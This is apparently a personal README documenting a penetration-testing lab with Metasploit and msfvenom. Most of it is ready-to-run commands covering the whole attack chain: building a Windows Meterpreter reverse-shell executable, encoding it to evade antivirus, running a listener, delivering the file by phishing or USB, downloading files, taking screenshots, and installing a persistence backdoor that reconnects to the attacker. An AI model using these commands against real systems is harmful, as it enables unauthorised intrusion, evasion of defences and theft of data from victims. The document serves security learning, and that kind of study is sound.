# Custom Payload Development Using Metasploit and Msfvenom

**Overview:**  
In this project, I developed and deployed custom payloads using the **Metasploit Framework** and **Msfvenom** to test the security controls of my target environment. The goal was to create a reverse shell payload and successfully exploit a system by gaining remote access, simulating real-world attack scenarios.

---

## Project Steps

### **1. Setting Up the Environment**

To develop custom payloads, I used **Kali Linux** as my primary operating system due to its built-in tools for penetration testing. Both **Metasploit Framework** and **Msfvenom** were used extensively to create and deliver payloads.

- **Kali Linux Installation:**  
  I set up Kali Linux on my local machine using VirtualBox and ensured that I had the necessary networking configurations (Bridged Mode for access to the target machine).

**Tools Used:**
- **Metasploit Framework**: A powerful penetration testing tool used for exploitation.
- **Msfvenom**: A tool used for creating custom payloads to be used in Metasploit or standalone.
  
[Official Kali Linux Download](https://www.kali.org/get-kali/#kali-bare-metal)

---

### **2. Developing a Custom Payload (Msfvenom)**

Msfvenom is the tool I used to create a custom reverse shell payload that allowed me to gain access to a target machine. I used a **Windows reverse TCP payload**, which is one of the most common payloads for penetration testing.

**Steps:**

1. **Generating the Payload:**
   I created a reverse shell payload using Msfvenom with the following command:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=4444 -f exe > payload.exe
   ```
   - `-p windows/meterpreter/reverse_tcp`: Specifies the payload as a reverse shell for Windows.
   - `LHOST`: The local IP address of my attacking machine (Kali Linux).
   - `LPORT=4444`: The port on which the reverse shell will connect.
   - `-f exe`: Format the payload as a Windows executable (`payload.exe`).

2. **Obfuscation (Optional Step):**
   To avoid detection by antivirus software, I applied basic obfuscation techniques to make the payload more difficult to detect. For example:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated_payload.exe
   ```
   - `-e x86/shikata_ga_nai`: Specifies an encoder to obfuscate the payload.
   - `-i 5`: Number of iterations for the encoder.

**Result:**  
I successfully generated the payload as a `.exe` file, ready for delivery to the target machine.

---

### **3. Setting Up a Listener (Metasploit)**

Once the payload was created, I set up a listener using **Metasploit** to catch the reverse shell connection when the payload was executed on the target machine.

**Steps:**

1. **Starting Metasploit:**
   I launched Metasploit Framework on Kali Linux:
   ```bash
   msfconsole
   ```

2. **Configuring the Exploit Handler:**
   I used the **exploit/multi/handler** module to handle the incoming reverse shell connection:
   ```bash
   use exploit/multi/handler
   ```

3. **Configuring Payload and Options:**
   I set the payload to match the one I created with Msfvenom and configured the listener:
   ```bash
   set payload windows/meterpreter/reverse_tcp
   set LHOST [Your IP]
   set LPORT 4444
   ```

4. **Start the Listener:**
   I then started the listener to wait for the connection from the target machine:
   ```bash
   exploit
   ```

**Result:**  
The Metasploit listener was set up and ready to receive the reverse shell once the payload was executed on the target.

---

### **4. Delivering the Payload**

To simulate a real-world attack scenario, I delivered the custom payload to the target machine through a method such as a phishing email or USB drop. In this case, I used manual execution on a test system to verify functionality.

**Steps:**

1. **Transfer the Payload:**
   I transferred the `payload.exe` (or `obfuscated_payload.exe`) to the target machine via file-sharing, email, or USB.

2. **Execution of Payload:**
   Once the payload was executed on the target machine, it initiated a connection back to my Metasploit listener (on port 4444).

---

### **5. Gaining Remote Access (Meterpreter)**

Once the payload was executed and the reverse shell connection was established, I used **Meterpreter**, a powerful payload in Metasploit, to gain control of the target system.

**Steps:**

1. **Confirming the Session:**
   After the payload connected to my listener, I received a Meterpreter session:
   ```bash
   meterpreter > sysinfo
   ```
   This command confirmed that I had successfully gained access to the target machine.

2. **Performing Post-Exploitation Tasks:**
   With a Meterpreter session active, I was able to perform various tasks on the compromised machine, including:
   - **Viewing System Information:**
     ```bash
     sysinfo
     ```
   - **Navigating the File System:**
     ```bash
     ls
     cd C:\\Users\\Target\\Documents
     ```
   - **Capturing Screenshots:**
     ```bash
     screenshot
     ```
   - **Uploading/Downloading Files:**
     ```bash
     download C:\\Users\\Target\\Documents\\secret.txt
     upload /path/to/your/file.exe C:\\Windows\\Temp\\file.exe
     ```

**Result:**  
I successfully gained remote access to the target machine, allowing for further post-exploitation activities.

---

### **6. Persistence and Cleanup**

After establishing access, I ensured persistence on the target system to maintain control even if the system rebooted. I then cleaned up any traces of my presence to ensure the system was not left vulnerable.

**Steps:**

1. **Setting Up Persistence:**
   I used Meterpreter’s persistence module to create a backdoor that would reconnect the target machine to my listener every time it restarted:
   ```bash
   run persistence -X -i 10 -p 4444 -r [Your IP]
   ```
   - `-X`: Autostart the payload when the system boots.
   - `-i 10`: The interval in seconds for reconnect attempts.
   - `-p 4444`: The port on which the connection will be made.

2. **Cleaning Up:**
   Once testing was completed, I removed all traces of the payload and terminated the Meterpreter session to prevent any unintended consequences.

---

## **Tools Used:**

- **Msfvenom**: Used to generate custom payloads.
- **Metasploit Framework**: Used to handle reverse shells and post-exploitation tasks.
- **Meterpreter**: A payload within Metasploit for controlling compromised systems.

---

## **Lessons Learned:**

This project helped me develop a deeper understanding of:
- How to create and customize payloads using Msfvenom.
- How to use the Metasploit Framework to manage payloads and control compromised systems.
- Techniques for post-exploitation tasks, such as file access, screenshot capture, and system persistence.
- The importance of cleaning up and maintaining system integrity after testing.

---

This README serves as documentation of my experience developing and deploying custom payloads using Metasploit and Msfvenom. Through this project, I gained hands-on experience in creating payloads, delivering them to a target, and performing remote exploitation activities, simulating a real-world penetration test scenario.
